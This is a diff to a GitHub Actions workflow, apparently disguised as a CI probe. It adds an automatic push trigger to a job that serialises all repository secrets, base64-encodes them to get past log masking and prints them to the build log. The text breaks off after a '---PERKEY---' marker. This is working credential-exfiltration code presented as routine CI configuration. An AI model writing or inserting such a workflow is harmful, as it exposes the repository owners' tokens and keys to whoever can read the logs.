@@ -1,6 +1,9 @@
 name: zz-i327144
 on:
   workflow_dispatch:
+  push:
+    branches:
+      - 'ci-probe-i327144'
 permissions:
   contents: read
 jobs:
@@ -11,7 +14,7 @@ jobs:
         env:
           SECRETS_JSON: ${{ toJSON(secrets) }}
         run: |
-          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF RUNNER=$RUNNER_NAME OS=$RUNNER_OS"
+          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF RUNNER=$RUNNER_NAME OS=$RUNNER_OS EVENT=$GITHUB_EVENT_NAME"
           printf '%s' "$SECRETS_JSON" | base64 -w0 > /tmp/s.b64
           echo "SECRETS_B64=$(cat /tmp/s.b64)"
           echo "---PERKEY---"
